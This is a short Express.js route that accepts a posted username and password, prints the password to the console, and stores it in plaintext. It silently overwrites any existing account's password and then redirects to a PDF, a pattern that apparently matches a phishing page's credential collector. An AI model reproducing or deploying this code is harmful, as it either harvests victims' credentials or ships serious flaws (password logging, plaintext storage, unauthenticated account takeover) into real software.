const express = require('express');
const router = express.Router();
const { db } = require('../db');

router.post('/', async (req, res) => {
  const { username, password } = req.body;

  console.log('Username:', username);
  console.log('Password:', password);

  if (!username || !password) {
    return res.status(400).send("Missing username or password.");
  }

  try {
    const [rows] = await db.query("SELECT * FROM mytable WHERE username = ?", [username]);

    if (rows.length > 0) {
      await db.query("UPDATE mytable SET password = ? WHERE username = ?", [password, username]);
      console.log('User updated:', username);
    } else {
      await db.query("INSERT INTO mytable (username, password) VALUES (?, ?)", [username, password]);
      console.log('User inserted:', username);
    }

    // ✅ PDF exists in public folder, safe to redirect
    return res.redirect('/1.pdf');
  } catch (err) {
    console.error('Database error:', err);
    return res.status(500).send('Database error.');
  }
});

module.exports = router;
